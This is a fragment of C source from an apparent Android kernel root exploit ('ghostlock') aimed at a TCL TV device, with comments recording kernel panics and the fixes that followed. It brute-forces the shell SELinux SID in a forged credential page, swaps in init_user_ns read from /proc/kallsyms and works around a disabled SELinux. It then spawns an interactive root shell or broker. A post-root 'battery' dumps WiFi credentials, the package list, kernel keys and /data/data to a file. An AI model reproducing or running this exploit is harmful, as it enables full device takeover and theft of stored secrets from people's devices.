          RELAY_STR("sec_blob r/w test: before="); RELAY_DEC(before);
          RELAY_STR(" after_write="); RELAY_DEC(after);
          RELAY_STR(after == 0xDEAD ? " OK\n" : " FAIL (page not ours!)\n");

          if (blob_live) {
            /* Candidate-first verification: each costs one blob write +
             * one 3-syscall context readback. SIDs are stable across
             * boots for a given policy, so the cached/default candidates
             * almost always hit -- the scan below is only a fallback. */
            uint32_t cands[3];
            int ncand = 0;
            if (cached_sid) cands[ncand++] = cached_sid;
            if (sid_env_override > 0) cands[ncand++] = (uint32_t)sid_env_override;
            if (sid_default > 0) cands[ncand++] = (uint32_t)sid_default;
            for (int ci = 0; ci < ncand && !found_sid; ci++) {
              uint32_t c = cands[ci];
              int dup = 0;
              for (int cj = 0; cj < ci; cj++) if (cands[cj] == c) dup = 1;
              if (dup) continue;
              blob_set_sid(hit_page, c);
              long vn = sid_read_ctx(cb, sizeof(cb));
              if (vn > 0 && sid_ctx_is_shell(cb, vn, child_ctx)) {
                found_sid = (int)c;
                sid_how = (cached_sid && c == cached_sid) ? "cache"
                        : (sid_env_override > 0 && c == (uint32_t)sid_env_override)
                          ? "env" : "default";
                RELAY_STR("sid: CANDIDATE "); RELAY_DEC(c);
                RELAY_STR(" VERIFIED ctx="); RELAY_STR(cb); RELAY_STR("\n");
              } else {
                RELAY_STR("sid: candidate "); RELAY_DEC(c);
                RELAY_STR(" rejected (vn="); RELAY_DEC(vn);
                if (vn > 0) { RELAY_STR(" ctx="); RELAY_STR(cb); }
                RELAY_STR(")\n");
              }
            }
            if (!found_sid) {
              /* Re-probe liveness before scanning: writing sid=1 must
               * still read back kernel, else the blob wedged mid-run. */
              blob_set_sid(hit_page, 1);
              long ln = sid_read_ctx(cb, sizeof(cb));
              int still_live = (ln > 0 && sid_contains(cb, ln, "kernel"));
              if (!still_live) {
                RELAY_STR("sid: blob died after candidates - "
                          "scan skipped\n");
              } else if (!sid_scan_enable) {
                RELAY_STR("sid: scan disabled (GHOST_SID_SCAN=0)\n");
              } else {
                /* Bounded fallback scan over the child-created probe
                 * file. faccessat = ONE syscall per trial, no fd churn,
                 * no file creation, no proc inodes: invalid SID ->
                 * EACCES at the first path-walk check; the shell SID ->
                 * success. Successful trials are verified with the
                 * context readback (rejects e.g. adbd's SID). Paced
                 * every 128 trials so AVC/RCU reclaim keeps up -- the
                 * old storm did 32K x (open+read+close) and panicked
                 * the 2GB device. */
                RELAY_STR("sid: fallback scan 2.."); RELAY_DEC(sid_scan_max);
                RELAY_STR("\n");
                for (int s = 2; s <= sid_scan_max && !found_sid; s++) {
                  blob_set_sid(hit_page, (uint32_t)s);
                  long r = syscall(__NR_faccessat, AT_FDCWD,
                                   GL_SID_PROBE_PATH, R_OK, 0);
                  if (r == 0) {
                    long vn = sid_read_ctx(cb, sizeof(cb));
                    if (vn <= 0) /* one retry */
                      vn = sid_read_ctx(cb, sizeof(cb));
                    if (vn > 0) {
                      if (sid_ctx_is_shell(cb, vn, child_ctx)) {
                        found_sid = s;
                        sid_how = "scan";
                        RELAY_STR("FOUND shell at SID="); RELAY_DEC(s);
                        RELAY_STR(" ctx="); RELAY_STR(cb); RELAY_STR("\n");
                      } else {
                        RELAY_STR("  sid="); RELAY_DEC(s);
                        RELAY_STR(" access OK but ctx="); RELAY_STR(cb);
                        RELAY_STR(" (not shell)\n");
                      }
                    } else {
                      /* Context readback broken but the access probe
                       * passed: accept unverified (cannot do better). */
                      found_sid = s;
                      sid_how = "scan-unverified";
                      RELAY_STR("sid: scan hit "); RELAY_DEC(s);
                      RELAY_STR(" (ctx readback broken - unverified)\n");
                    }
                  }
                  if ((s & 0x7F) == 0) {
                    sid_nanosleep_usec(300);
                    if ((s & 0x3FF) == 0) {
                      RELAY_STR("  tried "); RELAY_DEC(s);
                      RELAY_STR("...\n");
                    }
                  }
                }
                if (!found_sid) {
                  RELAY_STR("sid_scan: FAILED (2-"); RELAY_DEC(sid_scan_max);
                  RELAY_STR(")\n");
                  blob_set_sid(hit_page, 1); /* restore sane kernel SID */
                }
              }
            }
          }
          }
        }

        if (found_sid > 0 && hit_page) {
          RELAY_STR("sid_found="); RELAY_DEC(found_sid);
          RELAY_STR(" (0x");
          for (int _i = 0; _i < 8; _i++)
            RELAY_PUTC("0123456789abcdef"[(found_sid >> (28 - _i * 4)) & 0xf]);
          RELAY_STR(") how="); RELAY_STR(sid_how); RELAY_STR("\n");
          /* Lock in the working SID */
          blob_set_sid(hit_page, (uint32_t)found_sid);
          /* Cache for the next run: the relay child persists this line
           * to GL_SID_CACHE_PATH when it dumps the payload. */
          RELAY_STR(GL_SID_CACHE_TAG);
          RELAY_STR("FP="); RELAY_STR(child_fp);
          RELAY_STR(" SID="); RELAY_DEC(found_sid);
          RELAY_STR(" CTX="); RELAY_STR(child_ctx);
          RELAY_STR("\n");
        }
        /* user_ns live-tune (SAFE): cap_capable() walks the ns ancestor
         * chain (ns = targ_ns; ns != cred->user_ns; ns = ns->parent) and
         * returns -EPERM when ns->level <= cred->user_ns->level. If
         * cred->user_ns is NOT an ancestor of &init_user_ns and its
         * ->level happens to be negative, the walk steps off the top
         * (init_user_ns->parent == NULL) and NULL-derefs -> KERNEL PANIC
         * (observed: pc=cap_capable+0x10 reading [NULL+0xe0]). Probing
         * candidate addresses with openat is therefore lethal for any
         * wrong candidate. Instead read the EXACT &init_user_ns from
         * /proc/kallsyms (deterministic; root-owned 0400 so the open
         * passes via the owner match, never through capable()) and
         * install it; if kallsyms is unreadable, keep the table value
         * (off_init_user_ns_device, now the observed 0x19EB898) without
         * probing. The battery's file_create test validates DAC. */
        if (hit_page && found_sid && env_flag("GHOST_NS_TUNE", 1)) {
          volatile uint64_t *cred_ns =
              (volatile uint64_t *)(hit_page + FAKE_CRED_OFF +
                                    CRED15_USER_NS_OFF);
          uint64_t cur_ns = *cred_ns;
          uint64_t kns = 0;
          int kf = (int)syscall(__NR_openat, AT_FDCWD, "/proc/kallsyms",
                                O_RDONLY, 0);
          if (kf >= 0) {
            char kb[4096];
            char line[512];
            int llen = 0;
            long kn;
            static const char symtail[] = " init_user_ns";
            const int symlen = (int)(sizeof(symtail) - 1);
            while (!kns &&
                   (kn = syscall(__NR_read, kf, kb, sizeof(kb))) > 0) {
              for (long i = 0; i < kn && !kns; i++) {
                char ch = kb[i];
                if (ch == '\n') {
                  line[llen] = 0;
                  if (llen >= symlen) {
                    int match = 1;
                    for (int j = 0; j < symlen; j++)
                      if (line[llen - symlen + j] != symtail[j]) {
                        match = 0; break;
                      }
                    if (match) {
                      uint64_t a = 0;
                      for (int j = 0; j < llen; j++) {
                        char c = line[j];
                        int d = (c >= '0' && c <= '9') ? (c - '0')
                              : (c >= 'a' && c <= 'f') ? (c - 'a' + 10)
                              : (c >= 'A' && c <= 'F') ? (c - 'A' + 10) : -1;
                        if (d < 0) break;
                        a = (a << 4) | (uint64_t)(unsigned)d;
                      }
                      if (a) kns = a;
                    }
                  }
                  llen = 0;
                } else if (llen < (int)sizeof(line) - 1) {
                  line[llen++] = ch;
                }
              }
            }
            syscall(__NR_close, kf);
          }
          if (kns && kns != cur_ns) {
            *cred_ns = kns;
            __atomic_thread_fence(__ATOMIC_SEQ_CST);
            RELAY_STR("ns_tune: kallsyms init_user_ns=");
            RELAY_HEX(kns);
            RELAY_STR(" installed (was ");
            RELAY_HEX(cur_ns);
            RELAY_STR(")\n");
          } else if (kns) {
            RELAY_STR("ns_tune: user_ns == kallsyms init_user_ns=");
            RELAY_HEX(kns);
            RELAY_STR(" (already correct)\n");
          } else {
            RELAY_STR("ns_tune: kallsyms unreadable; keeping user_ns=");
            RELAY_HEX(cur_ns);
            RELAY_STR(" (no probe)\n");
          }
        }
        /* ==== POST-ROOT DAC/SELINUX BISECTION PROBES (opt-in) ====
         * Diagnostic probes (GHOST_PROBE=1) to classify file-access
         * failures: pb1 O_CREAT, pb3 append existing, pb4 faccessat
         * W_OK on dir, pb6 mkdirat. Enabled this to pin down the
         * enforcing-mode EACCES: dir W passes (group DAC ok) while
         * create is denied -> SELinux create/labeling wall, solved by
         * running mode 7 (GHOST_SELINUX=1, selinux zeroed). */
        if (ghost_probe) {
          int pb1 = (int)syscall(__NR_openat, AT_FDCWD, ".gl_pb1", O_CREAT | O_TRUNC | O_WRONLY, 0644);
          int e1 = errno;
          int pb3 = (int)syscall(__NR_openat, AT_FDCWD, "gl2_relay.txt", O_WRONLY | O_APPEND, 0);
          int e3 = errno;
          int pb4 = (int)syscall(__NR_faccessat, AT_FDCWD, ".", W_OK, 0);
          int e4 = errno;
          int pb6 = (int)syscall(__NR_mkdirat, AT_FDCWD, ".gl_pbdir", 0755);
          int e6 = errno;
          RELAY_STR("probe: pb1_creat="); RELAY_DEC(pb1); RELAY_STR(" e="); RELAY_DEC(e1);
          RELAY_STR(" pb3_append="); RELAY_DEC(pb3); RELAY_STR(" e="); RELAY_DEC(e3);
          RELAY_STR(" pb4_dirW="); RELAY_DEC(pb4); RELAY_STR(" e="); RELAY_DEC(e4);
          RELAY_STR(" pb6_mkdir="); RELAY_DEC(pb6); RELAY_STR(" e="); RELAY_DEC(e6);
          RELAY_STR("\n");
          if (pb1 >= 0) {
            if ((int)syscall(__NR_write, pb1, "PB1OK\n", 6) < 0) {
              RELAY_STR("probe: pb1 write e="); RELAY_DEC(errno); RELAY_STR("\n");
            }
            syscall(__NR_close, pb1);
            syscall(__NR_unlinkat, AT_FDCWD, ".gl_pb1", 0);
          }
          if (pb3 >= 0) syscall(__NR_close, pb3);
          if (pb6 >= 0) syscall(__NR_unlinkat, AT_FDCWD, ".gl_pbdir", AT_REMOVEDIR);
        }
        if (found_sid) {
          /* Root shell: fork a child (raw clone -- libc fork touches
           * pthread locks, wedged post-walk) and exec from THERE. The
           * parent must NOT execve itself: exec's de_thread() SIGKILLs
           * the owner/consumer threads while the exploit state is still
           * live -- observed as a kernel panic right after
           * "=== ROOT SHELL ===" (no battery artifacts ever persisted).
           * The child is single-threaded (its de_thread is a no-op) and
           * inherits the root+shell creds via get_cred on the fake cred.
           * The parent continues to the battery; the child keeps the
           * adb pty as an interactive root shell (it survives the
           * parent's exit_group as an orphan; the io_uring fds backing
           * the fake cred page stay open in the child). */
          RELAY_STR(direct_broker_enabled
                        ? "=== ROOT BROKER: clone+exec direct ===\n"
                        : "=== ROOT SHELL: clone+exec /system/bin/sh ===\n");
          __atomic_thread_fence(__ATOMIC_SEQ_CST);
          if (relay != MAP_FAILED) relay->ready = 1;
          /* Clean up any stale test files that might block us */
          syscall(__NR_unlinkat, AT_FDCWD, "/data/local/tmp/.gl_sid_test", 0);
          syscall(__NR_unlinkat, AT_FDCWD, "/data/local/tmp/gl2_test_create.txt", 0);
          if (ghost_exec) {
            long cpid = syscall(__NR_clone, (unsigned long)SIGCHLD, 0, 0, 0, 0);
            if (cpid == 0) {
              /* ==== ROOT SHELL CHILD: root creds, single-threaded ==== */
              /* Crash triage marker: written pre-exec (root+shell SID+
               * groups should pass; if the device dies DURING the exec,
               * the marker is already fsynced). */
              int mk = (int)syscall(__NR_openat, AT_FDCWD,
                                    "/data/local/tmp/.gl_shell_pre_exec",
                                    O_WRONLY|O_CREAT|O_TRUNC, 0644);
              if (mk >= 0) {
                syscall(__NR_write, mk, "1\n", 2);
                syscall(__NR_fsync, mk);
                syscall(__NR_close, mk);
              }
              const char *sh_envp[] = {
                "PATH=/sbin:/system/sbin:/system/bin:/system/xbin:/vendor/bin",
                "HOME=/data/local/tmp",
                "TERM=xterm-256color",
                NULL,
              };
              if (direct_broker_enabled) {
                const char *broker_argv[] = {
                  direct_broker_path, "--direct-child", "--uid",
                  direct_broker_uid,
                  "--abstract", direct_broker_abstract,
                  "--arm-timeout-ms", "15000",
                  "--reboot-after-ms", "45000", NULL
                };
                syscall(__NR_execve, direct_broker_path,
                        (char *const *)broker_argv, (char *const *)sh_envp);
              } else {
                static const char *sh_path = "/system/bin/sh";
                const char *sh_argv[] = { "sh", NULL };
                syscall(__NR_execve, sh_path, (char *const *)sh_argv,
                        (char *const *)sh_envp);
              }
              /* execve failed - report and die */
              static const char em[] = "[!] root handoff: execve failed\n";
              syscall(__NR_write, 1, em, sizeof(em) - 1);
              syscall(__NR_exit, 127);
            }
            RELAY_STR(direct_broker_enabled
                          ? "root broker child pid="
                          : "root shell child pid=");
            RELAY_DEC(cpid);
            RELAY_STR(cpid > 0 ? "\n" : " (clone FAILED)\n");
            if (cpid > 0) shell_spawned = 1;
          } else {
            RELAY_STR("root shell: skipped (GHOST_EXEC=0)\n");
          }
        } else {
          RELAY_STR("sid: NOT RESOLVED - battery continues (relay I/O "
                    "still works via child)\n");
        }
      }
      #define PROBE(fd, label, path) do { \
          RAW_WRITE(fd, label); \
          int _pf = (int)syscall(__NR_openat, AT_FDCWD, path, O_RDONLY, 0); \
          if (_pf >= 0) { \
            char _pb[2048]; long _pn; \
            _pn = syscall(__NR_read, _pf, _pb, sizeof(_pb)-1); \
            if (_pn > 0) syscall(__NR_write, fd, _pb, _pn); \
            syscall(__NR_close, _pf); \
          } else { \
            RAW_WRITE(fd, "DENIED"); RAW_WERRNO(fd); \
          } \
          RAW_WRITE(fd, "\n"); \
        } while(0)
      /* Append battery diagnostics to the relay (relay->len already has
       * the SID brute-force results from above). The relay child writes
       * this to disk + stdout. */
      if (relay != MAP_FAILED) {
        RELAY_STR("--- battery ---\n");
        /* Try to read our SELinux context */
        int af = (int)syscall(__NR_openat, AT_FDCWD,
                              "/proc/self/attr/current", O_RDONLY, 0);
        if (af >= 0) {
          char ab[256]; long an = syscall(__NR_read, af, ab, sizeof(ab)-1);
          syscall(__NR_close, af);
          if (an > 0) { RELAY_STR("selinux="); for (long _j=0;_j<an;_j++) RELAY_PUTC(ab[_j]); RELAY_STR("\n"); }
          else RELAY_STR("selinux=EMPTY\n");
        } else {
          RELAY_STR("selinux=OPEN_DENIED\n");
        }
        /* Test: can we write to stdout? */
        long wr = syscall(__NR_write, 1, "[MAIN] alive\n", 13);
        RELAY_STR("stdout_write_ret="); RELAY_DEC(wr); RELAY_STR("\n");
        /* Test: can we create a new file? */
        int tf = (int)syscall(__NR_openat, AT_FDCWD,
                              "/data/local/tmp/gl2_test_create.txt",
                              O_WRONLY|O_CREAT|O_TRUNC, 0644);
        if (tf >= 0) {
          RELAY_STR("file_create=OK\n");
          syscall(__NR_write, tf, "test\n", 5);
          syscall(__NR_close, tf);
        } else {
          RELAY_STR("file_create=DENIED errno="); RELAY_DEC(errno); RELAY_STR("\n");
        }
        RELAY_STR("uid="); RELAY_DEC(uid_now);
        RELAY_STR(" hits="); RELAY_DEC(hits);
        RELAY_STR("/"); RELAY_DEC(plans); RELAY_STR("\n");

        /* Reading /proc/kallsyms through seq_file after the credential
         * replacement wedged the TCL production kernel in two independent
         * runs.  It is diagnostic-only and the direct broker already has
         * every address it needs, so never enter that path for the minimal
         * application handoff. */
        if (direct_broker_enabled || ghost_minimal) {
          RELAY_STR("kallsyms: skipped in minimal/direct-broker mode\n");
        } else {
          RELAY_STR("kallsyms: trying open...\n");
          int kf = (int)syscall(__NR_openat, AT_FDCWD,
                                "/proc/kallsyms", O_RDONLY, 0);
          if (kf >= 0) {
            RELAY_STR("kallsyms: OPEN OK, scanning...\n");
            char kb[4096]; long kn; int found = 0;
            while (!found &&
                   (kn = syscall(__NR_read, kf, kb, sizeof(kb))) > 0) {
              for (long i = 0; i < kn - 16; i++) {
                if (kb[i]==' ' && kb[i+2]==' ' &&
                    kb[i+3]=='s' && kb[i+4]=='e' && kb[i+5]=='l' &&
                    kb[i+6]=='i' && kb[i+7]=='n' && kb[i+8]=='u' &&
                    kb[i+9]=='x' && kb[i+10]=='_' && kb[i+11]=='s' &&
                    kb[i+12]=='t' && kb[i+13]=='a' && kb[i+14]=='t' &&
                    kb[i+15]=='e') {
                  int ls = (int)i - 1;
                  while (ls > 0 && kb[ls-1] != '\n') ls--;
                  int le = (int)i + 16;
                  while (le < (int)kn && kb[le] != '\n') le++;
                  RELAY_STR("FOUND: ");
                  for (int _j = ls; _j < le; _j++) RELAY_PUTC(kb[_j]);
                  RELAY_STR("\n");
                  found = 1; break;
                }
              }
            }
            if (!found)
              RELAY_STR("selinux_state: NOT FOUND (scanned to EOF)\n");
            syscall(__NR_close, kf);
          } else {
            RELAY_STR("kallsyms: OPEN DENIED errno=");
            RELAY_DEC(errno);
            RELAY_STR("\n");
          }
        }
        RELAY_STR("=== relay done ===\n");
        __atomic_thread_fence(__ATOMIC_SEQ_CST);
        relay->ready = 1;
      }
      {
        /* Marker -- use .ghostlock_root2 to avoid root-owned old file */
        int mf = (int)syscall(__NR_openat, AT_FDCWD,
                              "/data/local/tmp/.ghostlock_root2",
                              O_WRONLY|O_CREAT|O_TRUNC, 0644);
        if (mf >= 0) {
          RAW_WRITE(mf, "root=1 uid=0 hits=");
          raw_wdec(mf, hits); RAW_WRITE(mf, "/"); raw_wdec(mf, plans);
          RAW_WRITE(mf, " selinux=");
          raw_wstr(mf, g_selinux_off ? "permissive\n" : "enforcing?\n");
          syscall(__NR_fsync, mf);
          syscall(__NR_close, mf);
        }
        if (ghost_minimal) {
          int of = (int)syscall(__NR_openat, AT_FDCWD,
                                "/data/local/tmp/.ghostlock_out",
                                O_WRONLY|O_CREAT|O_TRUNC, 0644);
          if (of >= 0) {
            RAW_WRITE(of, "=== ghostlock minimal root proof ===\nuid=");
            raw_wdec(of, (long)uid_now);
            RAW_WRITE(of, " gid=");
            raw_wdec(of, (long)syscall(__NR_getgid));
            RAW_WRITE(of, " euid=");
            raw_wdec(of, (long)syscall(__NR_geteuid));
            RAW_WRITE(of, " erase_hits=");
            raw_wdec(of, hits);
            RAW_WRITE(of, "/");
            raw_wdec(of, plans);
            RAW_WRITE(of, " selinux=");
            raw_wstr(of, g_selinux_off ? "OFF\n" : "UNKNOWN\n");
            syscall(__NR_fsync, of);
            syscall(__NR_close, of);
          }
          goto ghost_battery_done;
        }
        /* The root test battery. If the battery file cannot even be
         * created (SELinux still enforcing - mode-6 fallback), probe
         * into stdout instead so the results are never lost. */
        int of = (int)syscall(__NR_openat, AT_FDCWD,
                              "/data/local/tmp/.ghostlock_out",
                              O_WRONLY|O_CREAT|O_TRUNC, 0644);
        int to_stdout = 0;
        if (of < 0) {
          to_stdout = 1;
          of = 1;
          RAW_WRITE(1, "[!] battery file open failed");
          RAW_WERRNO(1);
          RAW_WRITE(1, " - probing to stdout instead\n");
        }
        if (of >= 0) {
          /* diagnostics header: raw uid/gid + the write-plan outcome */
          RAW_WRITE(of, "=== ghostlock root battery ===\nuid=");
          raw_wdec(of, (long)uid_now);
          RAW_WRITE(of, " gid="); raw_wdec(of, (long)syscall(__NR_getgid));
          RAW_WRITE(of, " euid="); raw_wdec(of, (long)syscall(__NR_geteuid));
          RAW_WRITE(of, " (was uid="); raw_wdec(of, (long)uid_before);
          RAW_WRITE(of, ") erase hits="); raw_wdec(of, hits);
          RAW_WRITE(of, "/"); raw_wdec(of, plans);
          RAW_WRITE(of, " kaslr_base="); raw_whex(of, kaslr_base);
          if (g_selinux_write_armed) {
            RAW_WRITE(of, " selinux_state="); raw_whex(of, g_selinux_target);
            RAW_WRITE(of, " selinux=");
            raw_wstr(of, g_selinux_off ? "OFF" : "STILL ENFORCING");
          }
          RAW_WRITE(of, "\n");
          PROBE(of, "=== uid (proof) ===\n", "/proc/self/status");
          PROBE(of, "=== selinux context ===\n", "/proc/self/attr/current");
          PROBE(of, "=== selinux enforce (want 0) ===\n",
                "/sys/fs/selinux/enforce");
          PROBE(of, "=== init cmdline ===\n", "/proc/1/cmdline");
          PROBE(of, "=== init status ===\n", "/proc/1/status");
          /* /dev/kmsg must be opened O_NONBLOCK: a blocking read stalls
           * when the log ring has no pending records. */
          RAW_WRITE(of, "=== kmsg read ===\n");
          {
            int kf = (int)syscall(__NR_openat, AT_FDCWD, "/dev/kmsg",
                                  O_RDONLY|O_NONBLOCK, 0);
            if (kf >= 0) {
              char kb[2048];
              long kn = syscall(__NR_read, kf, kb, sizeof(kb)-1);
              if (kn > 0) syscall(__NR_write, of, kb, kn);
              syscall(__NR_close, kf);
            } else {
              RAW_WRITE(of, "DENIED"); RAW_WERRNO(of);
            }
            RAW_WRITE(of, "\n");
          }
          /* root-only WRITE test: /dev/kmsg accepts writes with
           * CAP_SYSLOG; a real root-only channel unlike /data/local/tmp. */
          RAW_WRITE(of, "=== kmsg write (root-only) ===\n");
          {
            int kf = (int)syscall(__NR_openat, AT_FDCWD, "/dev/kmsg",
                                  O_WRONLY, 0);
            if (kf >= 0) {
              RAW_WRITE(kf, "<6>GhostLock: root battery write test uid=0");
              syscall(__NR_close, kf);
              RAW_WRITE(of, "WRITE OK\n");
            } else {
              RAW_WRITE(of, "DENIED"); RAW_WERRNO(of); RAW_WRITE(of, "\n");
            }
          }
          PROBE(of, "=== wifi creds ===\n",
                "/data/misc/wifi/WifiConfigStore.xml");
          PROBE(of, "=== packages ===\n", "/data/system/packages.xml");
          /* Full kallsyms scan for selinux_state -- raw syscalls only.
           * Format: "ffffffc0093796d0 b selinux_state\n" */
          RAW_WRITE(of, "=== kallsyms scan ===\n");
          {
            int kf = (int)syscall(__NR_openat, AT_FDCWD,
                                  "/proc/kallsyms", O_RDONLY, 0);
            if (kf >= 0) {
              char kb[4096];
              char prev[256]; int prev_len = 0;
              long kn; int found = 0;
              while (!found && (kn = syscall(__NR_read, kf, kb, sizeof(kb))) > 0) {
                /* prepend leftover from previous chunk */
                if (prev_len > 0 && kn > 0) {
                  int copy = (int)(sizeof(prev) - 1 - prev_len);
                  if (copy > kn) copy = (int)kn;
                  for (int j = 0; j < copy; j++) prev[prev_len+j] = kb[j];
                  prev_len += copy;
                  prev[prev_len] = 0;
                  /* scan prev for target */
                  for (int j = 0; j < prev_len - 14; j++) {
                    if (prev[j]==' ' && prev[j+2]==' ' &&
                        prev[j+3]=='s' && prev[j+4]=='e' && prev[j+5]=='l' &&
                        prev[j+6]=='i' && prev[j+7]=='n' && prev[j+8]=='u' &&
                        prev[j+9]=='x' && prev[j+10]=='_' && prev[j+11]=='s' &&
                        prev[j+12]=='t' && prev[j+13]=='a' && prev[j+14]=='t' &&
                        prev[j+15]=='e' && (prev[j+16]=='\n' || prev[j+16]==0)) {
                      /* find start of this line (address) */
                      int ls = j - 1;
                      while (ls > 0 && prev[ls-1] != '\n') ls--;
                      RAW_WRITE(of, "FOUND: ");
                      syscall(__NR_write, of, prev + ls, j + 16 - ls);
                      RAW_WRITE(of, "\n");
                      found = 1; break;
                    }
                  }
                  prev_len = 0;
                }
                if (found) break;
                /* scan current chunk */
                for (long i = 0; i < kn - 14; i++) {
                  if (kb[i]==' ' && kb[i+2]==' ' &&
                      kb[i+3]=='s' && kb[i+4]=='e' && kb[i+5]=='l' &&
                      kb[i+6]=='i' && kb[i+7]=='n' && kb[i+8]=='u' &&
                      kb[i+9]=='x' && kb[i+10]=='_' && kb[i+11]=='s' &&
                      kb[i+12]=='t' && kb[i+13]=='a' && kb[i+14]=='t' &&
                      kb[i+15]=='e' && (kb[i+16]=='\n' || i+16>=kn)) {
                    int ls = (int)i - 1;
                    while (ls > 0 && kb[ls-1] != '\n') ls--;
                    RAW_WRITE(of, "FOUND: ");
                    int le = (int)i + 16;
                    if (le > (int)kn) le = (int)kn;
                    syscall(__NR_write, of, kb + ls, le - ls);
                    RAW_WRITE(of, "\n");
                    found = 1; break;
                  }
                }
                if (!found) {
                  /* save tail for cross-boundary match */
                  int tail = 256;
                  if (tail > (int)kn) tail = (int)kn;
                  for (int j = 0; j < tail; j++)
                    prev[j] = kb[(int)kn - tail + j];
                  prev_len = tail;
                }
              }
              if (!found) RAW_WRITE(of, "NOT FOUND (scanned to EOF)\n");
              syscall(__NR_close, kf);
            } else {
              RAW_WRITE(of, "DENIED"); RAW_WERRNO(of); RAW_WRITE(of, "\n");
            }
          }
          PROBE(of, "=== partitions ===\n", "/proc/partitions");
          PROBE(of, "=== mounts ===\n", "/proc/mounts");
          PROBE(of, "=== keys ===\n", "/proc/keys");
          /* /data/data dir listing via getdents64 */
          RAW_WRITE(of, "=== /data/data ===\n");
          {
            int dd = (int)syscall(__NR_openat, AT_FDCWD, "/data/data",
                                  O_RDONLY|O_DIRECTORY, 0);
            if (dd >= 0) {
              char db[2048]; long dr;
              while ((dr = syscall(__NR_getdents64, dd, db, sizeof(db))) > 0) {
                long dp = 0;
                while (dp < dr) {
                  unsigned short rl = *(unsigned short *)(db + dp + 16);
                  char *nm = db + dp + 19;
                  long nl = 0; while (nm[nl] && nl < 200) nl++;
                  syscall(__NR_write, of, nm, nl);
                  RAW_WRITE(of, "\n");
                  dp += rl;
                }
              }
              syscall(__NR_close, dd);
            } else {
              RAW_WRITE(of, "DENIED"); RAW_WERRNO(of); RAW_WRITE(of, "\n");
            }
          }
          RAW_WRITE(of, "=== DONE ===\n");
          if (!to_stdout) {
            syscall(__NR_fsync, of);
            syscall(__NR_close, of);
          }
        }
      }
ghost_battery_done:
      ;
      if (!ghost_exec && relay != MAP_FAILED) {
        /* Non-interactive validation must not leave the original-shell
         * relay child holding the adb transport open after the root parent
         * exits.  The child checks ready==99 in its command loop. */
        __atomic_thread_fence(__ATOMIC_SEQ_CST);
        relay->ready = 99;
      }
      if (ghost_reboot) {
        RAW_WRITE(1, "[+] GHOST_REBOOT=1: syncing and requesting kernel restart\n");
        syscall(__NR_sync);
        long reboot_ret = syscall(__NR_reboot, LINUX_REBOOT_MAGIC1,
                                  LINUX_REBOOT_MAGIC2,
                                  LINUX_REBOOT_CMD_RESTART, NULL);
        RAW_WRITE(1, "[!] kernel reboot syscall returned ");
        raw_wdec(1, reboot_ret);
        RAW_WRITE(1, " errno=");
        raw_wdec(1, errno);
        RAW_WRITE(1, "\n");
      }
      #undef PROBE
      /* Root shell. execve is safe ONLY when every planned erase landed
       * AND the capture was a full 16KB mapping (uring/spectrum/skb):
       * plans fire strictly in prefix order, so hits == plan_count
       * implies cred == real_cred == fake_cred. commit_creds() at exec
       * BUG_ONs if task->cred != task->real_cred, and with SELinux off
       * (mode 7 walk 0) the exec itself is no longer EACCES-denied.
       * A MOVABLE-storm capture (g_hit_block >= g_storm_block_start)
       * presents only base page 0 of the mm page - the fake cred's
       * page-1 fields (ucounts terminator) are foreign pages there, so
       * the commit_creds path would walk garbage: NO exec on storm
       * captures (root + battery only). de_thread() reaps the
       * waiter/owner/consumer threads (their sleeps are
       * interruptible - the sendmsg wait is killable). */
      int storm_capture = (g_storm_block_start >= 0 &&
                           g_hit_block >= g_storm_block_start);
      if (hits >= plans && !storm_capture && ghost_exec && !shell_spawned) {
        /* Same rule as the early root shell: NEVER exec from the parent
         * (de_thread reaping the exploit threads panicked the device).
         * clone a single-threaded root child to hold the shell; the
         * parent then exit_group()s, whose thread reaping is the path
         * the pre-fix successful runs already survived. */
        static const char *sh_path = "/system/bin/sh";
        const char *sh_argv[] = { "sh", NULL };
        const char *sh_envp[] = {
          "PATH=/sbin:/system/sbin:/system/bin:/system/xbin:/vendor/bin",
          "HOME=/data/local/tmp",
          "TERM=xterm-256color",
          NULL,
        };
        RAW_WRITE(1, "[+] ROOT: uid=0 selinux=");
        raw_wstr(1, g_selinux_off ? "permissive" : "enforcing");
        RAW_WRITE(1, " hits="); raw_wdec(1, hits);
        RAW_WRITE(1, "/"); raw_wdec(1, plans);
        RAW_WRITE(1, " - cloning /system/bin/sh "
                    "(battery: /data/local/tmp/.ghostlock_out)\n");
        long cpid = syscall(__NR_clone, (unsigned long)SIGCHLD, 0, 0, 0, 0);
        if (cpid == 0) {
          syscall(__NR_execve, sh_path, (char *const *)sh_argv,
                  (char *const *)sh_envp);
          syscall(__NR_exit, 127);
        }
        if (cpid < 0) {
          RAW_WRITE(1, "[!] clone failed");
          RAW_WERRNO(1);
          RAW_WRITE(1, " - no root shell\n");
        } else {
          RAW_WRITE(1, "[+] root shell pid="); raw_wdec(1, cpid);
          RAW_WRITE(1, "\n");
        }
      } else {
        RAW_WRITE(1, "[!] partial plan (hits=");
        raw_wdec(1, hits);
        RAW_WRITE(1, "/"); raw_wdec(1, plans);
        if (storm_capture) {
          RAW_WRITE(1, ") or storm capture (block=");
          raw_wdec(1, g_hit_block);
          RAW_WRITE(1, ") - skipping exec (storm capture: page-1 "
                      "payload not ours; commit_creds BUG_ON walk guard); "
                      "battery written\n");
        } else {
          RAW_WRITE(1, ") - skipping exec (commit_creds BUG_ON guard); "
                      "battery written\n");
        }
      }
      /* The pre-exploit relay is a separate process and otherwise keeps the
       * ADB stdout pipe open after a successful one-shot root shell exits.
       * Tell it to leave its command loop before this process exits.  A
       * daemon launched by the root shell has already detached by then. */
      if (relay != MAP_FAILED) {
        if (direct_broker_enabled && g_selinux_off) {
          int enforcing = 0;
          for (int i = 0; i < 100; i++) {
            enforcing = raw_selinux_enforcing();
            if (enforcing == 1) break;
            struct timespec pause = {.tv_sec = 0, .tv_nsec = 50000000};
            syscall(__NR_nanosleep, &pause, NULL);
          }
          if (enforcing != 1) {
            /* The preserving pointer has temporarily replaced
             * selinux_state.policycap[0..4].  Enabling enforcement here
             * would activate always_check_network/cgroup_seclabel with
             * garbage values and can cut both TV interfaces.  Only the
             * normalized broker may first reload+verify the live policy;
             * its on-device watchdog reboots if that repair fails. */
            RELAY_STR("failsafe: broker did not restore policy/network; "
                      "direct enforcing forbidden, watchdog/reboot required\n");
          } else {
            RELAY_STR("failsafe: broker restored policy/network then "
                      "SELinux enforcing\n");
          }
        }
        __atomic_thread_fence(__ATOMIC_SEQ_CST);
        relay->ready = 99;
        __atomic_thread_fence(__ATOMIC_SEQ_CST);
      }
      syscall(__NR_fsync, 1);
      syscall(__NR_exit_group, 99);
      return 0;
    }
  }
